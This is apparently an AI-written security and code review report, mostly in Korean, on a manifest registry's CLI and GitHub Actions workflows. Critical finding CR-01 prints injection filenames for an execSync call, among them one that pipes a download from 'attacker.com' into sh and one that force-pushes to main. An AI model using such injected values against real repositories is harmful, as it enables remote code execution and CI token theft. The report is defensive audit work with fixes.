---
phase: 18-registry
reviewed: 2026-04-20T04:22:00Z
depth: standard
files_reviewed: 21
files_reviewed_list:
  - packages/registry/src/index.ts
  - packages/registry/src/errors.ts
  - packages/registry/src/content-hash.ts
  - packages/registry/src/schema.ts
  - packages/registry/src/cache.ts
  - packages/registry/src/lockfile.ts
  - packages/registry/src/registry-client.ts
  - packages/registry/src/staleness.ts
  - packages/registry/src/cli/shared.ts
  - packages/registry/src/cli/add.ts
  - packages/registry/src/cli/types.ts
  - packages/registry/src/cli/doctor.ts
  - packages/registry/src/cli/submit.ts
  - packages/mcp/bin/agrune-mcp.ts
  - registry-seed/.github/scripts/_schema.mjs
  - registry-seed/.github/scripts/validate-schema.mjs
  - registry-seed/.github/scripts/pr-bot.mjs
  - registry-seed/.github/scripts/health-check.mjs
  - registry-seed/.github/workflows/pr-bot.yml
  - registry-seed/.github/workflows/health-check.yml
  - registry-seed/.github/workflows/validate-schema.yml
findings:
  critical: 2
  warning: 6
  info: 5
  total: 13
status: issues_found
---

# Phase 18: Code Review Report

**Reviewed:** 2026-04-20T04:22:00Z
**Depth:** standard
**Files Reviewed:** 21 (configured `registry-seed/validate-seed.mjs` does not exist on disk and was skipped)
**Status:** issues_found

## Summary

Phase 18 REGISTRY 구현물을 표준 depth 로 리뷰했다. 전반적으로 threat model 에 대한 인식이 높고 (T-18-XX 주석, Pitfall N 주석, defense-in-depth 재검증, atomic rename lockfile write, path-traversal whitelist 등) 품질이 좋다. `_schema.mjs` 와 `packages/registry/src/schema.ts` / `packages/manifest/src/schema.ts` 의 inline 복제는 DO-NOT-EDIT 헤더 + removal path 가 문서화되어 있고, 현재 시점 semantic 은 byte-level 로 일치한다.

다만 `pull_request_target` 을 쓰는 `pr-bot.mjs` 에서 fork PR 로부터의 입력을 다루는 두 군데가 **Critical** 로 드러났다:

1. `execSync` 에 `f.filename` 을 직접 interpolate — shell injection 표면이 열려 있음 (filter 가 prefix/suffix 만 막음).
2. fork head 가 commit 한 `maintainers.json` 을 그대로 읽음 — velocity holddown 우회 가능.

그 외 Warning 6건 (주로 edge-case / race / UX), Info 5건이다.

---

## Critical Issues

### CR-01: `pr-bot.mjs` `execSync` — shell injection via PR-controlled filename

**File:** `registry-seed/.github/scripts/pr-bot.mjs:81`
**Issue:**
`readBeforeJson(relPath)` 는 `execSync(\`git show origin/main:${relPath}\`)` 형태로 `relPath` 를 쉘 문자열에 그대로 interpolate 한다. 이 `relPath` 는 `octokit.pulls.listFiles` 가 반환한 `f.filename` 이고, `manifestFiles` 필터는 `startsWith('manifests/') && endsWith('.json')` 만 검사한다. 공격자는 fork 에서 다음과 같은 파일을 PR 에 포함시킬 수 있다:

```
manifests/evil$(curl -sL attacker.com/x|sh).json
manifests/foo`whoami`.json
manifests/bar;git push origin main --force;.json
```

워크플로우가 `pull_request_target` 로 돌면서 repo-scoped `GITHUB_TOKEN` 을 env 로 노출하므로, 쉘 명령이 실행되는 순간 `contents: read`, `issues: write`, `pull-requests: write` 권한 토큰이 유출된다. 그리고 같은 토큰으로 라벨을 찍는 정상 흐름이 뒤따르므로 이상 감지도 어렵다.

**Fix:**
`execSync` 를 `execFileSync` 로 바꾸고 argv 배열로 넘긴다. 또한 파일명에 쉘 메타문자를 차단하는 whitelist 를 거친다:

```js
import { execFileSync } from 'node:child_process'

const MANIFEST_FILENAME_RE = /^manifests\/[A-Za-z0-9][A-Za-z0-9.\-@+]{0,120}\.json$/

function readBeforeJson(relPath) {
  if (!MANIFEST_FILENAME_RE.test(relPath)) return null
  try {
    const raw = execFileSync('git', ['show', `origin/main:${relPath}`], {
      encoding: 'utf-8',
      stdio: ['ignore', 'pipe', 'ignore'],
    })
    return JSON.parse(raw)
  } catch {
    return null
  }
}
```

그리고 `manifestFiles` filter 에도 동일한 regex 를 추가해서 early-reject 한다.

---

### CR-02: `pr-bot.mjs` reads fork-controlled `maintainers.json` — velocity holddown bypass

**File:** `registry-seed/.github/scripts/pr-bot.mjs:109-116` + `.github/workflows/pr-bot.yml:31-35`
**Issue:**
`pr-bot.yml` 은 `pull_request_target` + `ref: ${{ github.event.pull_request.head.sha }}` 로 fork 의 tree 를 checkout 한다 (T-18-26 주석이 "read-only analysis" 라고 표기). 그런데 `readMaintainers()` 는 워킹 디렉터리의 `maintainers.json` 을 읽으며, 공격자는 fork PR 에 자신의 login 을 포함한 `maintainers.json` 을 동시 수정해서 포함시킬 수 있다. 결과적으로 `velocity:holddown` 라벨이 붙지 않고 held-down 상태를 건너뛴다 (다른 schema-fail / sensitive-review 라벨은 파일 내용 기반이라 영향 없음).

현재 노출된 위험은 "라벨 한 개를 생략" 수준이지만, **동일 패턴이 향후 maintainer 자동 merge / allow-list 기반 bypass 로 확대되면 그대로 머지 가드 우회**가 된다. 지금 막는 것이 올바르다.

**Fix:**
fork 가 제출한 tree 대신 base repo 의 main 에서 `maintainers.json` 을 조회한다:

```js
async function readMaintainersFromBase() {
  try {
    const { data } = await octokit.repos.getContent({
      owner,
      repo,
      path: 'maintainers.json',
      ref: 'main',
    })
    if (Array.isArray(data) || data.type !== 'file') return new Set()
    const raw = Buffer.from(data.content, 'base64').toString('utf-8')
    const parsed = JSON.parse(raw)
    return new Set(parsed.maintainers ?? [])
  } catch {
    return new Set()
  }
}
```

같은 취지로, 향후 `pull_request_target` 에서 fork tree 의 *정책 파일* (maintainers / allow-list / config) 을 읽는 모든 코드 경로를 동일 패턴으로 차단해야 한다. 관련 regression test 추가 권장 (pr-bot 유닛 테스트에 "fork 가 maintainers.json 을 수정해도 base 값이 쓰인다" 케이스).

---

## Warnings

### WR-01: `add.ts` overwrites user-set `disabled` marker on re-add

**File:** `packages/registry/src/cli/add.ts:126-139`
**Issue:**
`withoutHost = lock.entries.filter((e) => e.host !== entry.registry.host)` 후 새 entry 를 push 하는 과정에서 기존 entry 의 `disabled` 필드 (특히 `reason: 'user'` — 사용자가 수동으로 끈 것) 가 소실된다. doctor 가 auto-disabled 한 것도 마찬가지다. 결과적으로 "`maps add` 를 다시 돌리면 무음으로 disabled 해제됨" 이 된다.

**Fix:**
기존 entry 를 lookup 해서 `disabled` 를 보존한다. `reason: 'user'` 는 특히 `--force` 없이는 덮어쓰지 않는 게 UX 적으로 맞다:

```ts
const existing = lock.entries.find((e) => e.host === entry.registry.host)
if (existing?.disabled?.reason === 'user') {
  process.stderr.write(
    color.yellow(`! ${entry.registry.host} is user-disabled — use \`agrune maps enable <host>\` first\n`),
  )
  return 1
}
const newEntry: LockfileEntry = {
  host: entry.registry.host,
  // ... other fields
  ...(existing?.disabled?.reason === 'revoked' || existing?.disabled?.reason === 'stale'
    ? {} // fresh fetch clears auto-disable states (that's the point of re-adding)
    : existing?.disabled ? { disabled: existing.disabled } : {}),
}
```

---

### WR-02: `doctor.ts` revocation ignores `version` field in `incidents.json`

**File:** `packages/registry/src/cli/doctor.ts:215-219`
**Issue:**
`IncidentEntry` 는 `host`, `version?`, `reason?` 을 정의하지만 `fetchRevokedHosts` 는 `item.host` 만 `Set` 에 추가한다. incidents.json 에 `{host: 'news.ycombinator.com', version: '0.9.0'}` 가 들어오면 현재 코드는 `1.0.0` 까지 revoke 한다 — intended 가 "host 전체 revoke" 가 아니라면 false-positive 다. Plan 03 가 정의한 incidents.json 의 원래 의미를 재확인할 필요 있음.

**Fix:**
`Set<string>` 대신 `Map<string, Set<string>>` 를 써서 host→revoked-versions 로 저장하고, version 이 없으면 "모든 버전" 을 뜻하는 sentinel (`'*'`) 을 넣는다:

```ts
const rev = new Map<string, Set<string>>()
for (const item of body) {
  if (typeof item.host !== 'string') continue
  const set = rev.get(item.host) ?? new Set()
  set.add(typeof item.version === 'string' ? item.version : '*')
  rev.set(item.host, set)
}
// caller:
const versions = rev.get(entry.host)
const isRevoked = !!versions && (versions.has('*') || versions.has(entry.version))
```

---

### WR-03: `submit.ts` swallows non-404 `getContent` errors without action

**File:** `packages/registry/src/cli/submit.ts:250-258`
**Issue:**
`octokit.repos.getContent` 호출의 catch block 은 `status !== 404` 일 때 주석만 남기고 아무 동작도 하지 않는다 (`// Non-404 errors are still informational`). 실제로 이 경로는 `sha` 를 쓰지 않으므로 `getContent` 자체가 죽은 코드에 가깝다 — 이후 `createOrUpdateFileContents` 가 이미 존재하는 파일을 업데이트할 때 `sha` 없이 호출하면 422 로 실패한다. 현재 flow 에서 `update` 시나리오 (동일 host@version 재제출) 는 실패 경로로 빠지고 사용자는 "failed to write" 만 본다.

**Fix:**
둘 중 하나를 선택:
1. `getContent` 블록 전체를 제거하고 주석으로 "v0.5 는 신규 submit only, update 는 v0.6+" 라고 명시.
2. `sha` 를 받아서 `createOrUpdateFileContents` 에 전달:

```ts
let existingSha: string | undefined
try {
  const { data } = await octokit.repos.getContent({ owner, repo, path: prepared.manifestPath })
  if (!Array.isArray(data) && data.type === 'file') existingSha = data.sha
} catch (err) {
  if ((err as { status?: number }).status !== 404) {
    throw new RegistryError('REGISTRY_FETCH_FAILED', `getContent failed`, { cause: err })
  }
}
await octokit.repos.createOrUpdateFileContents({
  owner: userLogin, repo, path: prepared.manifestPath,
  message: prepared.prTitle, content: base64Content, branch: prepared.prBranch,
  ...(existingSha ? { sha: existingSha } : {}),
})
```

v0.5 MVP 범위 제약상 옵션 1 이 합리적이라면 최소한 죽은 코드는 지워서 "informational" 이라는 misleading 한 주석이 남지 않도록 한다.

---

### WR-04: `content-hash.ts` — `null` vs `undefined` cross-author drift

**File:** `packages/registry/src/content-hash.ts:19-23`
**Issue:**
`fast-json-stable-stringify` 는 `undefined` 값이 있는 키는 serialize 에서 drop 하지만 `null` 은 문자열 `"null"` 로 유지한다. 그런데 manifest schema 는 `FiberPathSegment.key: string | null` 을 허용 (null 이 legit value) — 여기는 문제 없다. 문제는 **optional 필드가 `undefined` 로 있는 manifest 와 key 가 아예 빠진 manifest 가 hash 가 같다는 점**이 정상인 반면, 어떤 객체를 `JSON.parse(JSON.stringify(obj))` 한 후 hash 를 재계산하면 `undefined` 필드가 사라져서 결국 결과는 같으나, **zod 가 `.default([...])` 로 채운 필드 (`allowedEnvironments` default `['dev']`) 는 파싱 전 원본에는 없었더라도 파싱 후에는 존재** — 여기서 hash drift 가 생긴다.

구체 시나리오:
- Author A: `{allowedEnvironments: ['dev']}` 를 명시 → hash H1
- Author B: `allowedEnvironments` 필드 생략 → zod default 로 `['dev']` 채움 → hash H1' (manifest 가 아닌 registry metadata 지만, `contentHash` 는 `entry.manifest` 만 받으므로 이 구체 예시는 괜찮음)

`contentHash` 가 manifest 만 받기 때문에 registry metadata 의 default 주입은 영향 없음. 하지만 `manifest` 자체도 optional 필드가 많고 (`ManifestMacro.params.<key>.required?`, `ManifestGroup.name?` 등), 툴체인에 따라 `"required": undefined` 로 직렬화되는 경우 vs 키 생략 경우가 mix 되면 drift 가능. 현재 코드는 `JSON.stringify` 가 `undefined` 를 drop 하므로 input 측에서 `undefined` 는 안전하지만, **null 값을 optional field 에 집어넣는 toolchain** (예: protobuf-to-json) 이 있으면 깨진다.

**Fix:**
최소: 테스트 케이스 추가 — "optional 필드가 `null` 로 들어와도 `undefined` 와 동일 hash" 를 assert (현재 깨질 것으로 예상). 만약 깨지면 canonical 전에 `null`-valued optional 필드를 strip 하는 전처리 단계를 추가:

```ts
function stripNullOptionals<T>(v: T): T {
  if (Array.isArray(v)) return v.map(stripNullOptionals) as unknown as T
  if (v && typeof v === 'object') {
    const out: Record<string, unknown> = {}
    for (const [k, val] of Object.entries(v)) {
      if (val === null || val === undefined) continue
      out[k] = stripNullOptionals(val)
    }
    return out as unknown as T
  }
  return v
}
export function contentHash(manifest: AgruneManifest): string {
  const canonical = stableStringify(stripNullOptionals(manifest))
  // ...
}
```

단, 이 변경은 `FiberPathSegment.key: string | null` — **legit null** — 과 충돌한다. 거기는 strip 에서 제외하거나, strip 을 명시적 allowlist 로 바꿔야 한다. 따라서 "문제가 확인되면" 단계적 대응 권장.

---

### WR-05: `health-check.mjs` — `seedUrl` 에 대한 scheme / private-host 재검증 부재

**File:** `registry-seed/.github/scripts/health-check.mjs:122-131`
**Issue:**
`health-check` 는 merged manifest 의 `seedUrl` 을 `page.goto(seedUrl)` 에 직접 넘긴다. pr-bot 이 머지 전 검증 (https + 공개 호스트) 을 했지만 **이미 merged 된 파일이 이후 수동으로 수정** (maintainer 가 로컬에서 `git push`) 되거나 오래된 entry 의 경우 검증 우회 가능. Playwright 는 `file://`, `data:` 등을 허용하므로 이론적으로 runner 내부 파일을 load 시도할 수도 있음 (현 권한으로 큰 피해는 없지만 defense-in-depth 위반).

**Fix:**
health-check 진입 시 seedUrl 을 재검증:

```js
function isSafeSeedUrl(u) {
  try {
    const parsed = new URL(u)
    if (parsed.protocol !== 'https:') return false
    if (isPrivateHost(parsed.hostname)) return false // 재사용: pr-bot.mjs 의 함수를 공유 모듈로 이동
    return true
  } catch { return false }
}
// ...
if (!isSafeSeedUrl(seedUrl)) {
  core.warning(`[${name}] seedUrl failed safety check, skipping: ${seedUrl}`)
  continue
}
```

`isPrivateHost` 를 `_shared.mjs` 로 뽑아서 pr-bot + health-check 가 공유하도록 리팩터.

---

### WR-06: `health-check.yml` — `actions/checkout` 가 `persist-credentials: false` 없음

**File:** `registry-seed/.github/workflows/health-check.yml:23-26`
**Issue:**
checkout action 에 `token: ${{ secrets.GITHUB_TOKEN }}` 을 전달하고 기본값대로 `persist-credentials: true` 인 상태에서 `npx playwright install --with-deps` 가 실행된다. Playwright 설치 스텝 자체는 신뢰 가능하지만, **이후 postinstall 스크립트가 있는 어떤 npm dep 라도 `.git/config` 의 `http.<url>.extraheader` 에서 토큰을 읽어낼 수 있다.** health-check 는 `contents: write` 권한이라 영향이 큼.

**Fix:**
`npm install` 이후 `git push` 직전까지 credential 을 꺼 둠:

```yaml
- name: Checkout main
  uses: actions/checkout@v4
  with:
    persist-credentials: false

- name: Setup Node.js
  uses: actions/setup-node@v4
  with:
    node-version: 22

- name: Install script dependencies
  working-directory: .github/scripts
  run: npm install --no-audit --no-fund

- name: Install Playwright Chromium
  working-directory: .github/scripts
  run: npx playwright install --with-deps chromium

- name: Run health check (snapshot-only)
  env: { ... }
  run: node .github/scripts/health-check.mjs

- name: Configure git push auth
  run: |
    git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
- name: Commit updated health-state.json
  run: | ...
```

---

## Info

### IN-01: `cache.ts` HOST_PATTERN 이 연속 `.` 을 허용

**File:** `packages/registry/src/cache.ts:31`
**Issue:**
`/^[a-z0-9][a-z0-9.\-]{0,252}$/i` 는 `foo..bar.com`, `a.-.b`, `foo-.com` 같은 DNS 관점에서 invalid 한 호스트도 통과시킨다. path-traversal 은 막히지만 (slash 금지) 디스크에 잘못된 파일명이 생길 수 있음 (Linux 허용, Windows 에서 `foo..bar.com@1.0.0.json` 은 특정 util 에서 parent 처럼 해석될 여지).
**Fix:** 선택적 엄격화 — `/^([a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?)(\.[a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?)*$/i` 로 label-based 패턴 교체. 기능에는 영향 없음.

---

### IN-02: `shared.ts` `errorExit` exit-code 체계 — `REGISTRY_FETCH_FAILED` 가 1

**File:** `packages/registry/src/cli/shared.ts:131-132`
**Issue:**
`LOCKFILE_WRITE_FAILED` → exit 2, 그 외 전부 1. CI 관점에서 "network transient" (fetch 실패) 와 "schema invalid" (data 오염) 를 구분하는 게 더 유용. 현재는 구분 불가.
**Fix:** exit code 표 확장 — `REGISTRY_FETCH_FAILED: 3` (transient), `REGISTRY_ENTRY_NOT_FOUND: 4`, `LOCKFILE_WRITE_FAILED: 2`, 그 외 1. Plan 02 user docs 에 명시. v0.6 로 defer 가능.

---

### IN-03: `doctor.ts` `fresh` state silent — UX 개선 여지

**File:** `packages/registry/src/cli/doctor.ts:116-118`
**Issue:**
`fresh` 인 entry 는 stdout 에 전혀 표시되지 않아서 "doctor 를 돌렸더니 침묵" = "lockfile 이 비었나?" 혼동이 날 수 있음. 마지막 summary 로 `N fresh, M week_old, K stale` 한 줄이라도 찍으면 UX 가 크게 개선됨.
**Fix:**
```ts
const summary = counts // { fresh, week_old, stale, auto_disabled }
process.stdout.write(
  color.dim(`(${summary.fresh} fresh, ${summary.week_old} week_old, ${summary.stale} stale, ${summary.auto_disabled} auto_disabled)\n`),
)
```

---

### IN-04: `agrune-mcp.ts` — `exec` 로 브라우저 열기 시 URL 미인용

**File:** `packages/mcp/bin/agrune-mcp.ts:214-217`
**Issue:**
`exec(\`${openCmd} ${devtoolsUrl}\`)` — `devtoolsUrl` 은 내부에서 템플릿으로 조립되므로 (`http://localhost:${devtoolsPort}/devtools`, port 는 `Number(...)`) 실제 취약하지 않지만, **code smell** 이다. 누군가 나중에 `startUrl` 을 여기 끼워 넣는다면 쉘 injection 가능.
**Fix:** `execFile` 로 변경:
```ts
const { execFile } = await import('node:child_process')
execFile(openCmd, [devtoolsUrl])
```
기존 Phase 11+ 에서 동일 패턴일 수 있으니 grep 후 일괄 정리 권장.

---

### IN-05: `_schema.mjs` — sync checkpoint 자동화 부재

**File:** `registry-seed/.github/scripts/_schema.mjs:1-20`
**Issue:**
inline schema 와 monorepo 의 `packages/manifest/src/schema.ts` / `packages/registry/src/schema.ts` 의 sync 가 **인간 주의력에만 의존**. 현재 리뷰 시점 semantic 은 일치하지만, 이후 manifest v4 / tier enum 확장 등 drift 발생 시 감지할 장치가 없음. DO-NOT-EDIT 헤더와 `external-sync-instructions.md` 는 procedural 보호일 뿐.
**Fix:** monorepo 메인 CI 에 drift-check job 추가:
```yaml
- name: Registry schema drift check
  run: |
    node scripts/check-registry-schema-drift.mjs
    # hashes _schema.mjs 의 zod tree 와 packages/registry/src/schema.ts 의 zod tree 를 정규화 후 비교
```
v0.6 `@agrune/registry` npm publish 후 inline copy 제거로 근본 해결이면 IN-05 는 자동 해소.

---

_Reviewed: 2026-04-20T04:22:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
